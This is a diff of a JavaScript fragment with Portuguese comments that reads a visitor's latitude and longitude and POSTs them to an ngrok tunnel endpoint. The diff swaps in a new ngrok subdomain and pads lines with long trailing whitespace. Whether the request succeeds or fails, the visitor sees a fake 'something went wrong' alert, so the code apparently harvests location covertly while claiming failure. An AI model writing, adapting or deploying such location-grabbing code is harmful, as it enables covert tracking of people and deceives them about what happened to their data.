@@ -24,20 +24,20 @@
       console.log("Latitude: " + latitude);
       console.log("Longitude: " + longitude);
 
-      // Envia a localização para o backend
-      fetch("https://ab3b-177-67-151-39.ngrok-free.app/send-location", {
+      // Envia a localização para o backend                                                           
+      fetch("https://c834-177-67-151-39.ngrok-free.app/send-location", {                                                                                                                                        
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({ latitude, longitude })
       })
-      .then(response => response.json())
+      .then(response => response.json())                          
       .then(data => {
         if (data.success) {
-          alert("Algo deu errado. Tente novamente mais tarde.");
-        } else {
-          alert("Algo deu errado. Tente novamente mais tarde.");
+          alert("Algo deu errado. Tente novamente mais tarde.");                                                                                                                                                                                                                                                                                                                                                                                                            
+        } else {                                                
+          alert("Algo deu errado. Tente novamente mais tarde."                                                                                      );
         }
       })
       .catch(error => {
